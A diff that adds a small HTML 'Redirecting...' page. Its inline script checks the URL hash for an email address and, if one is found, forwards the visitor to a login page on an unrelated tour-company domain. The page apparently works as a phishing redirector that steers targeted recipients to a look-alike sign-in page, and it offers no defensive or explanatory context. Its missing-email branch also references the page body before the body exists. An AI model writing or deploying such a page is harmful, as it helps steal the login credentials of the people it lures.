@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script type="text/javascript">
+    (function() {
+      const email = window.location.hash.replace('#', '');
+      if (email) {
+        const redirectUrl = `https://login.mercury-tour.com/live01`;
+        window.location.href = redirectUrl;
+      } else {
+        document.body.innerHTML = "<p>Missing email in URL hash.</p>";
+      }
+    })();
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
